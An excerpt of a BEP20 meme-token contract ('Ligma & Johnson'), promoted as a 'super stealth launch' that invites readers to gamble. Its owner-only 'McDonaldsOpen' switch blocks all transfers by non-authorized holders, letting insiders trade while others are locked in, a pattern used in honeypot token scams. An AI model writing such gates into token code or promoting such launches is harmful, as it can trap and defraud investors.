...
Check SuperStealth function on our contract to receive the TG once its time for it! Now lets gamble for a while
...
contract LigmaJohnson is IBEP20, Auth {
    using SafeMath for uint256;
    ...
    string constant _name = "Ligma & Johnson !";
    string constant _symbol = "LigmaJohnson";
    uint8 constant _decimals = 9;

    string Telegram = "SuperStealthlaunch ON, TG soon";
    string Mudra = "SuperStealthlaunch ON, Link soon";

     // Superstealth like 

    function _getTG() public view returns (string memory)  {
    return Telegram;
    }
    
    function _getMudra() public view returns (string memory) {
    return Mudra;
    }
    ...
    bool public McDonaldsOpen = false;
    ...
    function _transferFrom(address sender, address recipient, uint256 amount) internal returns (bool) {
        ...
        if(!authorizations[sender] && !authorizations[recipient]){
            require(McDonaldsOpen,"McDonalds has closed");
        }
    ...
    // switch McDonalds Open or Closed Status
    function McDonaldsStatus(bool _status) public onlyOwner {
        McDonaldsOpen = _status;
    }
   ...
   // super stealth launch mode
    function _setTG(string memory _value) external authorized {
    Telegram = _value;
    }

    function _setMudra(string memory _value) external authorized {
    Mudra = _value;
    }
